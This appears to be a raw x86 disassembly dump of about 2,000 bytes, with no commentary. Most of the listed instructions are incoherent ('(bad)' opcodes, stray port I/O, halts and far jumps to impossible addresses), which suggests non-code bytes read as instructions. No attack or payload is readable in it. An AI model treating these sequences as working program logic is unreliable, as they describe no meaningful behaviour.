  41a3d8:	call   0xacb29db7
  41a3dd:	das    
  41a3de:	aam    0x75
  41a3e0:	jmp    0xe5a05380
  41a3e5:	fisttp WORD PTR [eax]
  41a3e7:	pop    esp
  41a3e8:	rcl    esp,0xed
  41a3eb:	jno    0x41a3a8
  41a3ed:	push   cs
  41a3ee:	shl    BYTE PTR [ebp-0x48],cl
  41a3f1:	xlat   BYTE PTR ds:[ebx]
  41a3f2:	fldenv [esi-0x56]
  41a3f5:	pop    ss
  41a3f6:	shl    BYTE PTR [edi+edi*4-0x25],cl
  41a3fa:	scas   eax,DWORD PTR es:[edi]
  41a3fb:	pop    esi
  41a3fc:	mov    ch,0x4f
  41a3fe:	or     DWORD PTR [ecx-0x4d],edx
  41a401:	and    ebp,esp
  41a403:	je     0x41a3b2
  41a405:	dec    ebp
  41a406:	call   0xee566566
  41a40b:	jno    0x41a488
  41a40d:	dec    esi
  41a40e:	shl    BYTE PTR [ebp+0x78],cl
  41a411:	xchg   esp,eax
  41a412:	dec    ebx
  41a413:	shl    DWORD PTR [edx+0x42],cl
  41a416:	dec    ebx
  41a417:	fstp   TBYTE PTR [eax+0x45]
  41a41a:	(bad)  
  41a41b:	mov    eax,0x4333b4a
  41a420:	cmp    eax,0x60f04541
  41a425:	xor    esi,DWORD PTR [ecx]
  41a427:	loope  0x41a429
	...
  41a439:	add    BYTE PTR [eax],al
  41a43b:	add    BYTE PTR [edi],dh
  41a43d:	dec    ax
  41a43f:	(bad)  [edx+0x67f73b46]
  41a445:	push   esi
  41a446:	rol    edi,1
  41a448:	pop    esp
  41a449:	aaa    
  41a44a:	sbb    esi,eax
  41a44c:	sub    al,BYTE PTR [edx+0x6]
  41a44f:	imul   DWORD PTR [ebx+0x42f00055]
  41a455:	pop    eax
  41a456:	sbb    dh,dh
  41a458:	fwait
  41a459:	push   ebp
  41a45a:	add    al,dh
  41a45c:	xor    bl,BYTE PTR [eax+0x8]
  41a45f:	test   ch,0x33
  41a462:	or     al,BYTE PTR [edi+edx*8]
  41a465:	xor    ebx,eax
  41a467:	xlat   BYTE PTR ds:[ebx]
  41a468:	in     eax,dx
  41a469:	inc    ecx
  41a46a:	out    0x19,eax
  41a46c:	jmp    0x41a4b0
  41a46e:	enter  0xbd03,0x41
  41a472:	int    0xef
  41a474:	fdiv   DWORD PTR [ebx]
  41a476:	mov    cl,0xe0
  41a478:	mov    bh,0x64
  41a47a:	(bad)  
  41a47b:	out    0xe0,al
  41a47d:	je     0x41a411
  41a47f:	in     al,dx
  41a480:	mov    esp,0xbcd8cc48
  41a485:	je     0x41a43f
  41a487:	fldcw  WORD PTR [esp+edx*4+0x3cbfe4af]
  41a48e:	ffreep st(7)
  41a490:	fild   DWORD PTR [ecx-0x7e]
  41a493:	fidivr DWORD PTR [ebx+ecx*2+0x3faeef72]
  41a49a:	(bad)
  41a49d:	cmp    ecx,DWORD PTR [eax]
  41a49f:	jmp    0x41a4a4
	...
  41a4b4:	fild   WORD PTR [edx+0x65]
  41a4b7:	xchg   cl,bh
  41a4b9:	jno    0x41a51e
  41a4bb:	jmp    0x48be16fb
  41a4c0:	fdiv   DWORD PTR [ecx+0x7c]
  41a4c3:	inc    ecx
  41a4c4:	nop
  41a4c5:	jno    0x41a530
  41a4c7:	dec    edx
  41a4c8:	lds    eax,FWORD PTR [ebp+0x66]
  41a4cb:	cmp    eax,0x4f5f7ee1
  41a4d0:	mov    bh,0xd0
  41a4d2:	push   eax
  41a4d3:	sbb    ebp,esp
  41a4d5:	xor    esp,DWORD PTR [ebp+0x3c]
  41a4d8:	scas   eax,DWORD PTR es:[edi]
  41a4d9:	cmp    DWORD PTR [ecx+ebp*8-0x20],esp
  41a4dd:	aas    
  41a4de:	outs   dx,BYTE PTR ds:[esi]
  41a4df:	adc    eax,0xc7a71bd
  41a4e4:	aam    0x59
  41a4e6:	data16 or bl,BYTE PTR [edx-0x1cef93cb]
  41a4ed:	jno    0x41a54e
  41a4ef:	or     eax,0x8635588
  41a4f4:	addr16 cmp al,0x47
  41a4f7:	add    eax,0xda6b466c
  41a4fc:	adc    al,0x58
  41a4ff:	les    ebp,FWORD PTR [eax+0x38]
  41a502:	data16 mov BYTE PTR [ebx+0x41],0x6d
  41a507:	ror    BYTE PTR [edi+0x40b96564],1
  41a50d:	xor    edi,DWORD PTR [edx-0x49]
  41a510:	xor    al,BYTE PTR [esi+0x8]
  41a513:	cdq    
  41a514:	fs inc eax
  41a516:	pop    eax
  41a517:	mov    esi,0x0
	...
  41a52c:	cmp    DWORD PTR [eax+ecx*1-0x47],eax
  41a530:	push   esp
  41a531:	inc    eax
  41a532:	inc    edi
  41a533:	mov    ch,BYTE PTR [eax]
  41a535:	inc    ecx
  41a536:	jnp    0x41a4bf
  41a538:	cmp    edx,eax
  41a53a:	inc    esp
  41a53b:	jle    0x41a55c
  41a53d:	pusha  
  41a53e:	add    BYTE PTR [bp+0x7bc8],dl
  41a543:	outs   dx,DWORD PTR ds:[esi]
  41a544:	xchg   edi,eax
  41a545:	out    dx,eax
  41a546:	hlt    
  41a547:	push   edx
  41a548:	adc    al,al
  41a54a:	fs push ebx
  41a54c:	or     dl,cl
  41a54e:	jp     0x41a5b5
  41a550:	push   edi
  41a551:	cwde   
  41a552:	push   edi
  41a553:	ins    DWORD PTR es:[edi],dx
  41a554:	pop    ecx
  41a555:	enter  0x6f44,0x47
  41a559:	(bad)  
  41a55a:	hlt    
  41a55b:	push   edx
  41a55c:	mov    al,ds:0x464164c4
  41a561:	mov    ecx,0xc4437563
  41a566:	hlt    
  41a567:	push   edx
  41a568:	push   eax
  41a569:	les    esp,FWORD PTR [eax+edx*2+0x54]
  41a56d:	leave  
  41a56e:	ja     0x41a5e7
  41a570:	mov    ds:0x840068c6,al
  41a575:	mov    ecx,0xea886f67
  41a57a:	js     0x41a5aa
  41a57c:	xchg   esi,eax
  41a57d:	mov    dl,0x6b
  41a57f:	add    BYTE PTR [ecx+edi*4-0x12679099],al
  41a586:	js     0x41a5b6
  41a588:	xchg   esi,eax
  41a589:	mov    dl,0x62
  41a58b:	add    BYTE PTR [ecx+0x7455d6],dl
	...
  41a5a1:	add    BYTE PTR [eax],al
  41a5a3:	add    BYTE PTR [eax-0x4e],al
  41a5a6:	ins    DWORD PTR es:[edi],dx
  41a5a7:	ins    BYTE PTR es:[edi],dx
  41a5a8:	xlat   BYTE PTR gs:[ebx]
  41a5aa:	pop    eax
  41a5ab:	push   0x614a7358
  41a5b0:	cmp    DWORD PTR [edx+0x8],esi
  41a5b3:	push   ebx
  41a5b4:	inc    edx
  41a5b5:	mov    ch,0x78
  41a5b7:	ja     0x41a5fd
  41a5b9:	leave  
  41a5ba:	imul   ebx,DWORD PTR [edi+eiz*1+0xa],0xeb195c59
  41a5c2:	imul   esp,DWORD PTR [eax],0x2178b1e7
  41a5c8:	and    eax,0x8c6663e8
  41a5cd:	xor    eax,edi
  41a5cf:	pop    esi
  41a5d0:	sahf   
  41a5d1:	sbb    ch,cl
  41a5d3:	push   ecx
  41a5d4:	lds    esi,FWORD PTR [ecx]
  41a5d6:	int    0x53
  41a5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5d9:	sbb    BYTE PTR [ecx],ch
  41a5db:	inc    edx
  41a5dc:	ins    DWORD PTR es:[edi],dx
  41a5dd:	push   ecx
  41a5de:	sub    bl,BYTE PTR [ecx+ebx*2+0x4a]
  41a5e2:	(bad)  
  41a5e3:	jno    0x41a664
  41a5e5:	popf   
  41a5e6:	call   0xf8a0224d
  41a5eb:	inc    DWORD PTR [edx+0x56]
  41a5ee:	cli    
  41a5ef:	push   0x1fd58f75
  41a5f4:	push   eax
  41a5f5:	fs cli 
  41a5f7:	bound  ebp,QWORD PTR [edi-0x77]
  41a5fa:	fnsave [ecx+0x45]
  41a5fd:	mov    ebp,0x563371d8
  41a602:	cli    
  41a603:	pop    esi
  41a604:	sub    DWORD PTR [ecx+0x71d3],eax
	...
  41a61a:	add    BYTE PTR [eax],al
  41a61c:	mov    WORD PTR [edx-0x23],?
  41a61f:	jb     0x41a65b
  41a621:	mov    cl,0xc
  41a623:	inc    esp
  41a624:	sub    DWORD PTR [edi-0x2ed78d15],edx
  41a62a:	or     BYTE PTR [ebp+eiz*1-0x35],al
  41a62e:	sub    BYTE PTR [ecx],ah
  41a630:	mov    cl,0x9f
  41a632:	or     al,0x51
  41a634:	shl    DWORD PTR [edi-0x172ee024],1
  41a63a:	jmp    0x41a6a2
  41a63c:	loopne 0x41a5d9
  41a63e:	retf   
  41a63f:	arpl   ax,si
  41a641:	jmp    0xbc21172d
  41a646:	(bad)  [edx-0x40]
  41a649:	sub    ebp,DWORD PTR [ecx]
  41a64b:	push   ecx
  41a64c:	jmp    0xbea4895a
  41a651:	mov    ebx,0xcadc4cd8
  41a656:	sub    BYTE PTR [ecx-0x4f],dl
  41a659:	xchg   esp,eax
  41a65a:	xchg   ecx,eax
  41a65b:	in     eax,dx
  41a65c:	scas   al,BYTE PTR es:[edi]
  41a65d:	inc    edx
  41a65e:	(bad)  
  41a660:	fsub   DWORD PTR [edx+edx*8+0x23]
  41a664:	mov    edi,0x7bf18c41
  41a669:	pop    esi
  41a66a:	sbb    al,0xae
  41a66d:	xchg   esp,eax
  41a66e:	xchg   edx,eax
  41a66f:	mov    eax,0xd0bf645f
  41a674:	jl     0x41a6ad
  41a676:	jno    0x41a69b
  41a678:	dec    edx
  41a679:	xor    ebx,DWORD PTR [ecx+eiz*8-0xd]
  41a67d:	pop    edi
  41a67e:	and    eax,0xd0
	...
  41a693:	add    BYTE PTR [ebx+0x74],bl
  41a696:	and    al,0xd9
  41a698:	inc    edx
  41a699:	cmp    esi,DWORD PTR [ebx]
  41a69b:	and    al,0x9b
  41a69d:	cmp    BYTE PTR [ebx-0xe],al
  41a6a0:	outs   dx,BYTE PTR ds:[esi]
  41a6a1:	inc    ecx
  41a6a2:	xor    al,BYTE PTR [edx+ebx*2]
  41a6a5:	pop    esi
  41a6a6:	adc    edx,esp
  41a6a8:	mov    ds:0x3de13267,eax
  41a6ad:	je     0x41a6ec
  41a6af:	in     eax,0x26
  41a6b1:	aaa    
  41a6b2:	fbstp  TBYTE PTR [ebp+0x242f6859]
  41a6b8:	cmp    eax,0x2eee1137
  41a6bd:	inc    edx
  41a6be:	fistp  QWORD PTR [esi+eax*2-0x22dbf0ad]
  41a6c5:	aaa    
  41a6c6:	icebp  
  41a6c7:	in     eax,dx
  41a6c8:	out    dx,al
  41a6c9:	inc    edx
  41a6ca:	fistp  QWORD PTR [esi+eax*8-0x20dc50ad]
  41a6d1:	inc    ecx
  41a6d2:	int3   
  41a6d3:	icebp  
  41a6d4:	mov    ebx,DWORD PTR [esi-0x40]
  41a6d7:	fsubr  st,st(6)
  41a6d9:	xchg   esp,eax
  41a6da:	lods   al,BYTE PTR ds:[esi]
  41a6db:	fdivr  DWORD PTR [edx-0x3bfc24c5]
  41a6e1:	push   0x67abd39b
  41a6e6:	or     BYTE PTR [edx-0x5ef7bcd4],bh
  41a6ec:	dec    ebx
  41a6ed:	popa   
  41a6ee:	pop    eax
  41a6ef:	leave  
  41a6f0:	pop    esi
  41a6f1:	xor    bh,BYTE PTR [edx-0x69]
  41a6f4:	sub    al,0x43
  41a6f6:	sub    BYTE PTR [eax+eax*1+0x0],bh
	...
  41a709:	add    BYTE PTR [eax],al
  41a70b:	add    BYTE PTR ds:0xe2b90859,bh
  41a711:	pop    esp
  41a712:	cmp    ecx,ecx
  41a714:	cmp    al,0x44
  41a716:	imul   edi,DWORD PTR [ebx-0x71],0x55
  41a71a:	inc    ebx
  41a71b:	test   al,0xdf
  41a71d:	lods   al,BYTE PTR ds:[esi]
  41a71e:	pop    ebx
  41a71f:	jp     0x41a70d
  41a721:	inc    edx
  41a722:	or     BYTE PTR [ecx],dh
  41a724:	fsub   QWORD PTR [eax+0x58]
  41a727:	sub    al,0xef
  41a729:	xor    eax,0x43d30964
  41a72e:	imul   ebx,DWORD PTR [ebx-0x50],0x5e
  41a732:	addr16 push esp
  41a734:	mov    bl,0xcc
  41a736:	dec    esp
  41a737:	adc    eax,0x48435cdc
  41a73c:	out    0x38,eax
  41a73e:	sub    BYTE PTR [edx],bl
  41a740:	fild   DWORD PTR [edx+0x7e]
  41a743:	or     al,0xbe
  41a745:	int3   
  41a746:	pop    ecx
  41a747:	sub    al,0xbc
  41a749:	pop    esp
  41a74a:	sub    BYTE PTR [ebx*4-0x701685cf],bh
  41a751:	fs inc ebp
  41a753:	sbb    DWORD PTR [ebp+0x74],ebx
  41a756:	pop    eax
  41a757:	push   cs
  41a758:	jle    0x41a7a2
  41a75a:	or     BYTE PTR [edx],bl
  41a75c:	cmp    ebp,DWORD PTR [eax+0x58]
  41a75f:	leave  
  41a760:	pop    edi
  41a761:	cmp    DWORD PTR [edx-0x23],edi
  41a764:	(bad)  
  41a765:	push   ebx
  41a766:	inc    ebx
  41a767:	test   al,0x3f
  41a769:	lods   al,BYTE PTR ds:[esi]
  41a76a:	pop    eax
  41a76b:	(bad)  
  41a76c:	pop    ebp
  41a76d:	dec    eax
  41a76e:	or     cl,ch
	...
  41a784:	aas    
  41a785:	pop    ecx
  41a786:	pop    eax
  41a787:	add    BYTE PTR [esi+0x78],dl
  41a78a:	pop    eax
  41a78b:	popa   
  41a78c:	push   es
  41a78d:	lds    edi,FWORD PTR [ebx+0x6f]
  41a790:	pop    es
  41a791:	in     al,dx
  41a792:	ss add ah,ch
  41a795:	add    dh,BYTE PTR [esi]
  41a797:	push   eax
  41a798:	inc    ebp
  41a799:	call   0xb9481af3
  41a79e:	arpl   WORD PTR [edx+0x11],si
  41a7a1:	xchg   BYTE PTR [eax],cl
  41a7a3:	dec    esi
  41a7a4:	sti    
  41a7a5:	fild   DWORD PTR [eax+eiz*1-0xb]
  41a7a9:	mov    dh,0x77
  41a7ab:	jae    0x41a72f
  41a7ad:	loopne 0x41a825
  41a7af:	fs inc edi
  41a7b1:	cwde   
  41a7b2:	inc    eax
  41a7b3:	push   esp
  41a7b4:	and    eax,ebp
  41a7b6:	inc    ecx
  41a7b7:	popa   
  41a7b8:	pop    esp
  41a7b9:	in     al,dx
  41a7ba:	adc    al,0x50
  41a7bc:	push   esp
  41a7bd:	lds    esi,FWORD PTR [edi+0x77]
  41a7c0:	dec    edx
  41a7c1:	(bad)  
  41a7c2:	push   0x41e4e532
  41a7c7:	push   esp
  41a7c8:	jne    0x41a83a
  41a7ca:	pop    eax
  41a7cb:	popa   
  41a7cc:	xchg   ch,al
  41a7ce:	jnp    0x41a83f
  41a7d0:	xchg   DWORD PTR [esi+esi*1+0x43e7a500],esi
  41a7d7:	push   eax
  41a7d8:	(bad)  
  41a7d9:	ja     0x41a833
  41a7db:	popa   
  41a7dc:	xchg   ch,al
  41a7de:	jnp    0x41a84f
  41a7e0:	xchg   DWORD PTR [esp+esi*8+0x44d77848],esi
  41a7e7:	and    BYTE PTR [eax],al
	...
  41a7f9:	add    BYTE PTR [eax],al
  41a7fb:	add    BYTE PTR [ebp-0x49],dh
  41a7fe:	ja     0x41a873
  41a800:	and    al,0x76
  41a803:	fs jne 0x41a807
  41a806:	inc    ebx
  41a807:	push   esp
  41a808:	xchg   ebp,eax
  41a809:	jo     0x41a863
  41a80b:	popa   
  41a80c:	push   esi
  41a80d:	les    edi,FWORD PTR [ebx+0x6f]
  41a810:	inc    edi
  41a811:	jmp    0x41a807
  41a813:	inc    edi
  41a814:	mov    WORD PTR [ecx],cs
  41a816:	lds    ecx,FWORD PTR [edi-0x54]
  41a819:	or     eax,0xadf70ea
  41a81e:	fdiv   QWORD PTR [ecx-0x50]
  41a821:	mov    ebp,0x2dd84ad7
  41a826:	sub    DWORD PTR [eax-0x53],edx
  41a829:	push   cs
  41a82a:	clc    
  41a82b:	je     0x41a7d0
  41a82d:	das    
  41a82e:	aad    0xff
  41a830:	sub    ecx,DWORD PTR [esi]
  41a832:	fsub   QWORD PTR [ebp-0x68]
  41a835:	sub    ch,dl
  41a837:	jno    0x41a7ea
  41a839:	stc    
  41a83a:	mov    ebp,0xdc4faf66
  41a83f:	jo     0x41a8bc
  41a841:	adc    esp,ebp
  41a843:	pop    ebx
  41a844:	push   ebp
  41a845:	adc    esp,ebp
  41a847:	bound  edi,QWORD PTR [esi+0x4b]
  41a84a:	(bad)  
  41a84b:	jae    0x41a7f9
  41a84d:	jl     0x41a83c
  41a84f:	pusha  
  41a850:	jnp    0x41a8b2
  41a852:	cli    
  41a853:	jae    0x41a801
  41a855:	jo     0x41a842
  41a857:	ins    DWORD PTR es:[edi],dx
  41a858:	ins    DWORD PTR es:[edi],dx
  41a859:	push   edx
  41a85a:	fbstp  TBYTE PTR [ecx+0x30]
  41a85d:	jl     0x41a84c
  41a85f:	pusha  
	...
  41a874:	cmp    eax,DWORD PTR [eax-0x42c08c06]
  41a87a:	ret    
  41a87b:	arpl   WORD PTR [ecx],si
  41a87d:	mov    edx,eax
  41a87f:	data16 cmp BYTE PTR [edi+ebx*8-0x6717390],ah
  41a887:	sbb    BYTE PTR gs:[edx+0x793171eb],ch
  41a88e:	xlat   BYTE PTR ds:[ebx]
  41a88f:	data16 das 
  41a891:	iret   
  41a892:	stc    
  41a893:	jo     0x41a890
  41a895:	xchg   ecx,eax
  41a896:	rcr    BYTE PTR [ebx-0x2d],1
  41a899:	cdq    
  41a89a:	loop   0x41a902
  41a89c:	out    dx,eax
  41a89d:	nop
  41a89e:	enter  0xf94c,0x94
  41a8a2:	shr    edi,cl
  41a8a4:	clc    
  41a8a5:	cmp    edx,ebx
  41a8a7:	mov    edi,0x23a857d0
  41a8ac:	fwait
  41a8ad:	xor    eax,0x3adef2c2
  41a8b2:	mov    bl,0x23
  41a8b4:	xlat   BYTE PTR ds:[ebx]
  41a8b5:	xor    eax,ebp
  41a8b7:	in     al,0xa8
  41a8b9:	das    
  41a8ba:	mov    cl,0xbf
  41a8bc:	jp     0x41a8f3
  41a8be:	ret    0xbef2
  41a8c1:	cmp    dl,BYTE PTR [ebx-0x7998d42a]
  41a8c7:	jmp    0xd5c1ea6b
  41a8cc:	scas   al,BYTE PTR es:[edi]
  41a8cd:	push   0x46acec94
  41a8d2:	sahf   
  41a8d3:	(bad)  
  41a8d4:	js     0x41a908
  41a8d6:	jnp    0x41a897
	...
  41a8ec:	pop    eax
  41a8ed:	cmp    ecx,DWORD PTR [ebp+0x724168e7]
  41a8f3:	and    eax,DWORD PTR [edx+0x60]
  41a8f6:	dec    ebx
  41a8f7:	(bad)  
  41a8f8:	pop    esi
  41a8f9:	inc    esi
  41a8fa:	push   ecx
  41a8fb:	jmp    0xe976e971
  41a900:	pop    ebp
  41a901:	inc    ebp
  41a902:	dec    eax
  41a903:	repz popa 
  41a905:	push   0x3039ed16
  41a90a:	inc    esi
  41a90b:	fstp   TBYTE PTR [esp+esi*2]
  41a90e:	sub    al,0xe9
  41a910:	cmp    al,0x45
  41a912:	inc    eax
  41a913:	jmp    0x41a93f
  41a915:	cmp    al,BYTE PTR [esi]
  41a917:	and    al,0x3d
  41a919:	aas    
  41a91a:	add    edi,edx
  41a91c:	sbb    al,BYTE PTR [ebp+0x13]
  41a91f:	jmp    0xd671114a
  41a924:	and    BYTE PTR [edx],dh
  41a926:	sbb    al,dh
  41a928:	out    dx,al
  41a929:	inc    ebp
  41a92a:	adc    edx,ecx
  41a92c:	jmp    0x6544:0x7efb0835
  41a933:	pop    es
  41a934:	push   esp
  41a935:	test   eax,0x3d43dc45
  41a93a:	gs into 
  41a93c:	jb     0x41a8e7
  41a93e:	aas    
  41a93f:	mov    DWORD PTR [ebx+0x36],0x4564bf7a
  41a946:	sub    BYTE PTR [edx-0x2f83bacc],bl
  41a94c:	cmp    eax,0xe97930
	...
  41a961:	add    BYTE PTR [eax],al
  41a963:	add    BYTE PTR [edx],al
  41a965:	cmp    BYTE PTR [esi-0x4b],ch
  41a968:	push   esi
  41a969:	push   0x7a
  41a96b:	mov    ebx,gs
  41a96d:	pop    ebp
  41a96e:	pop    edi
  41a96f:	mov    bh,BYTE PTR [ecx]
  41a971:	cmp    BYTE PTR [ecx-0x7a],bh
  41a974:	and    eax,0x20b65445
  41a979:	aaa    
  41a97a:	ins    BYTE PTR es:[edi],dx
  41a97b:	xchg   esi,eax
  41a97c:	out    0x43,al
  41a97e:	sub    BYTE PTR [edi+0x7c496d3b],ch
  41a984:	loope  0x41a9c8
  41a986:	imul   edi,DWORD PTR [edi-0x25],0x5e
  41a98a:	imul   ebx,DWORD PTR [ebx-0x3f],0x31
  41a98e:	gs dec edi
  41a990:	int3   
  41a991:	pop    edi
  41a992:	pop    edi
  41a993:	inc    edi
  41a994:	in     al,0x37
  41a996:	jge    0x41a9f2
  41a998:	test   al,0x5d
  41a99a:	imul   edi,DWORD PTR [edx],0xffffffe1
  41a99d:	imul   ebp,DWORD PTR [ebp+0x50],0x1a282fbe
  41a9a4:	jecxz  0x41a9d8
  41a9a6:	jns    0x41a9d8
  41a9a8:	fld    DWORD PTR [ebx+ebp*2+0x14]
  41a9ac:	int3   
  41a9ad:	pop    eax
  41a9ae:	jp     0x41a9be
  41a9b0:	mov    dh,0x31
  41a9b2:	fs or  al,0xc1
  41a9b5:	ins    BYTE PTR es:[edi],dx
  41a9b6:	inc    ebp
  41a9b7:	adc    al,0xb4
  41a9b9:	cmp    al,0x65
  41a9bb:	add    BYTE PTR [edx-0x6dad0b47],ah
  41a9c1:	mov    edx,0xde847778
  41a9c6:	imul   ebx,DWORD PTR [eax+eax*1+0x0],0x0
	...
  41a9da:	add    BYTE PTR [eax],al
  41a9dc:	nop
  41a9dd:	mov    ebx,0xe1427267
  41a9e2:	arpl   WORD PTR [esi+0x39],sp
  41a9e5:	or     BYTE PTR [esi+0x6e],cl
  41a9e8:	cmp    DWORD PTR [edi-0x1fb7918a],ebp
  41a9ee:	adc    al,0x41
  41a9f0:	push   esi
  41a9f1:	mov    cl,0x63
  41a9f3:	jne    0x41aa48
  41a9f5:	loopne 0x41aa0b
  41a9f7:	dec    ebp
  41a9f8:	inc    esp
  41a9f9:	(bad)  
  41a9fa:	push   ebp
  41a9fb:	addr16 dec eax
  41a9fd:	loop   0x41a9f3
  41a9ff:	dec    esi
  41aa00:	or     al,ah
  41aa02:	pusha  
  41aa03:	outs   dx,DWORD PTR ds:[esi]
  41aa04:	adc    bh,BYTE PTR [ecx-0x4f1ba40c]
  41aa0a:	outs   dx,DWORD PTR ds:[si]
  41aa0c:	clc    
  41aa0d:	lds    edi,FWORD PTR [eax+0x73]
  41aa10:	cmc    
  41aa11:	mov    edx,0xe0136568
  41aa16:	ins    DWORD PTR es:[edi],dx
  41aa17:	data16 or al,0xb1
  41aa1a:	push   ebp
  41aa1b:	je     0x41aa29
  41aa1d:	lds    esp,FWORD PTR [edx+0x0]
  41aa20:	cmp    al,0xbc
  41aa22:	imul   ebp,DWORD PTR [esi+0x39],0x507978bb
  41aa29:	mov    ebp,0xc24c0076
  41aa2e:	imul   esi,DWORD PTR [esi+edx*2-0x3b],0xe1956d61
  41aa36:	imul   esi,DWORD PTR [edx+0x7b],0x752076af
  41aa3d:	mov    bl,0x77
  41aa3f:	jae    0x41aa41
	...
  41aa51:	add    BYTE PTR [eax],al
  41aa53:	add    BYTE PTR [edx-0x799b893b],cl
  41aa59:	nop
  41aa5a:	arpl   WORD PTR [ebp-0x74],si
  41aa5d:	test   eax,0x92236cf8
  41aa62:	sub    al,0x5f
  41aa64:	out    dx,eax
  41aa65:	call   0x6b28:0xc1f272f7
  41aa6c:	in     eax,dx
  41aa6d:	(bad)
  41aa71:	retf   
  41aa72:	sub    BYTE PTR [eax-0x13],dh
  41aa75:	jmp    0x70ec:0xebf374db
  41aa7c:	mov    esp,ss
  41aa7e:	in     al,dx
  41aa7f:	(bad)  
  41aa81:	loope  0x41aa64
  41aa83:	jae    0x41aa3a
  41aa85:	fcomp  st(3)
  41aa87:	inc    esi
  41aa89:	nop
  41aa8a:	sbb    al,0x38
  41aa8c:	aam    0x90
  41aa8e:	sub    eax,0x26257830
  41aa93:	and    ebx,DWORD PTR [ecx+ebp*8-0x50]
  41aa97:	sub    ch,BYTE PTR [ecx-0x13]
  41aa9a:	sbb    bl,BYTE PTR [eax+0x71]
  41aa9d:	in     eax,dx
  41aa9e:	sbb    bl,BYTE PTR [eax+0x61]
  41aaa1:	rcr    BYTE PTR [eax],1
  41aaa3:	xor    ah,BYTE PTR [eax+ebx*8+0x18]
  41aaa7:	xor    ah,BYTE PTR [eax+edx*8+0x18]
  41aaab:	xor    dl,BYTE PTR [eax+ebx*8+0x18]
  41aaaf:	xor    dl,BYTE PTR [eax+edx*8+0x18]
  41aab3:	xor    al,BYTE PTR [eax+ebx*4+0x1c]
  41aab7:	xor    al,BYTE PTR [eax]
	...
  41aac9:	add    BYTE PTR [eax],al
  41aacb:	add    BYTE PTR [eax+ebp*2+0xc],al
  41aacf:	push   esp
  41aad0:	fs push 0x6b6963e6
  41aad6:	jmp    0x585c:0xc593e66
  41aadd:	gs iret 
  41aadf:	ins    DWORD PTR es:[edi],dx
  41aae0:	xor    BYTE PTR [eax-0x26],bl
  41aae3:	popa   
  41aae4:	and    eax,0x69ffe08b
  41aae9:	xchg   esp,eax
  41aaea:	and    eax,esp
  41aaec:	mov    ds:0x9bc436e0,eax
  41aaf1:	and    al,0x29
  41aaf3:	les    edx,FWORD PTR [ebx-0x743beae6]
  41aaf9:	xchg   edx,eax
  41aafa:	adc    esp,eax
  41aafc:	cmp    DWORD PTR [eax+0x1b],0xffffffc4
  41ab00:	jnp    0x41aa9c
  41ab02:	sbb    ah,al
  41ab04:	jae    0x41aa9b
  41ab06:	sbb    esp,eax
  41ab08:	imul   ebx,DWORD PTR [ebx+0x1c63c3ca],0xffffffb3
  41ab0f:	ret    
  41ab10:	pop    ebx
  41ab11:	push   ecx
  41ab12:	mov    esp,0xa61a53c3
  41ab17:	ret    
  41ab18:	dec    ebx
  41ab19:	cdq    
  41ab1a:	rol    ebx,0x43
  41ab1d:	daa    
  41ab1e:	retf   
  41ab1f:	ret    
  41ab20:	cmp    esp,DWORD PTR [eax-0x3a]
  41ab23:	ret    
  41ab24:	xor    esi,DWORD PTR [ebp-0x55d43c33]
  41ab2a:	xchg   edi,eax
  41ab2b:	ret    
  41ab2c:	and    esp,DWORD PTR [eax]
  41ab2e:	xchg   edi,eax
  41ab2f:	ret    
	...
  41ab44:	sbb    ebp,DWORD PTR [eax+ecx*4-0x7556ec3d]
  41ab4b:	ret    
  41ab4c:	or     ebx,DWORD PTR [eax-0x66]
  41ab4f:	ret    
  41ab50:	add    eax,DWORD PTR [esi]
  41ab52:	test   ebx,eax
  41ab54:	sti    
  41ab55:	sbb    eax,0xd2f3c370
  41ab5a:	jno    0x41ab1f
  41ab5c:	jmp    0x41ab64
  41ab5e:	push   ebx
  41ab5f:	(bad)
  41ab63:	(bad)  
  41ab64:	fistp  DWORD PTR [eax]
  41ab66:	push   ebp
  41ab67:	(bad)  
  41ab68:	ror    DWORD PTR [edi+edx*2],cl
  41ab6b:	(bad)  
  41ab6c:	retf   
  41ab6d:	imul   ecx,DWORD PTR [ebx-0x3c],0xffffffc3
  41ab71:	repnz xor al,ah
  41ab74:	mov    ebx,0xc834089a
  41ab79:	lds    edx,FWORD PTR [edx+0x2e]
  41ab7c:	rol    ch,1
  41ab7e:	lods   eax,DWORD PTR ds:[esi]
  41ab7f:	es enter 0x73c5,0x73
  41ab84:	iret   
  41ab85:	lds    edi,FWORD PTR [edi+0x64]
  41ab88:	iret   
  41ab89:	lds    ecx,FWORD PTR [edi+0x5f]
  41ab8c:	dec    edi
  41ab8d:	lds    esi,FWORD PTR [edx+0x62]
  41ab90:	dec    edi
  41ab91:	lds    ecx,FWORD PTR [ebx]
  41ab93:	pop    ebp
  41ab94:	dec    edi
  41ab95:	lds    esi,FWORD PTR [ecx+0x46c54f55]
  41ab9b:	dec    esp
  41ab9c:	dec    edi
  41ab9d:	lds    edi,FWORD PTR [edi+0x44c54f84]
  41aba3:	jg     0x41abf4
  41aba5:	(bad)
	...
  41abbc:	dec    edi
  41abbd:	lds    esi,FWORD PTR [edx+0x6e]
  41abc0:	dec    edi
  41abc1:	(bad)
  41abc4:	dec    edi
  41abc5:	lds    ebx,FWORD PTR [edx-0x77]
  41abc8:	dec    edi
  41abc9:	lds    edx,FWORD PTR [edi-0x263ab077]
  41abcf:	or     DWORD PTR [edi-0x3b],0xc54f5733
  41abd6:	bound  ecx,QWORD PTR [edi+0x4f]
  41abd9:	vorps  ymm1,ymm2,YMMWORD PTR [edi-0x3b]
  41abde:	push   ds
  41abdf:	sub    edi,ecx
  41abe1:	les    edx,FWORD PTR [ecx+0x29]
  41abe4:	iret   
  41abe5:	(bad)  
  41abe6:	jmp    0xcf28:0x1dc4cf29
  41abed:	les    ecx,FWORD PTR [eax+ebp*1-0x31]
  41abf1:	les    ebp,FWORD PTR [edi-0x58]
  41abf4:	enter  0xcec4,0xa8
  41abf8:	rol    ah,1
  41abfa:	mov    ebp,0x47c4c8ab
  41abff:	stos   BYTE PTR es:[edi],al
  41ac00:	rol    ah,1
  41ac02:	adc    DWORD PTR [eax],eax
  41ac04:	lock iret 
  41ac06:	hlt    
  41ac07:	xchg   ebx,eax
  41ac08:	lock iret 
  41ac0a:	hlt    
  41ac0b:	aad    0xe0
  41ac0d:	iret   
  41ac0e:	hlt    
  41ac0f:	dec    ebp
  41ac10:	repz iret 
  41ac12:	hlt    
  41ac13:	mov    ah,0xf2
  41ac15:	iret   
  41ac16:	hlt    
  41ac17:	adc    bl,ch
  41ac19:	iret   
  41ac1a:	hlt    
  41ac1b:	sub    ebp,0xffffffcf
  41ac1e:	hlt    
